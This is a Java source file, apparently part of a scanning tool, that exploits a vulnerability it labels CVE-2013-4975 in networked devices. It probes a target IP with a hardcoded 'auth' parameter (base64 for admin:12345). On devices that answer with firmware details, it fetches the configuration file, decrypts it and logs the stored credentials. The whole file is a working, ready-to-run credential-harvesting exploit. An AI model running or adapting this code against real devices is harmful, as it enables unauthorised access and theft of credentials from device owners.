package scanner;

import lombok.extern.slf4j.Slf4j;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.crypto.ConfigurationDecrypt;
import scanner.http.HttpClient;

import java.io.IOException;
import java.util.Objects;

@Slf4j
public class CVEScanner {

    private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
    private static final String CONFIG_FILE = "http://%s/System/configurationFile?auth=YWRtaW46MTIzNDU=";

    private static final HttpClient client = new HttpClient();

    public static void scanning(String ip) {
        try (Response response = client.execute(String.format(CVE_2013_4975, ip))) {
            ResponseBody responseBody = response.body();
            if (Objects.nonNull(responseBody)) {
                String body = responseBody.string();
                if (body.contains("firmwareVersion")) {
                    String credentials;
                    try (Response configFile = client.execute(String.format(CONFIG_FILE, ip))) {
                        ResponseBody configFileBody = configFile.body();
                        credentials = (Objects.nonNull(configFileBody))
                                ? " " + ConfigurationDecrypt.decrypt(configFileBody.byteStream())
                                : "";
                    }
                    log.info(ip + credentials);
                }
            }
        } catch (IOException ignored) {}
    }

}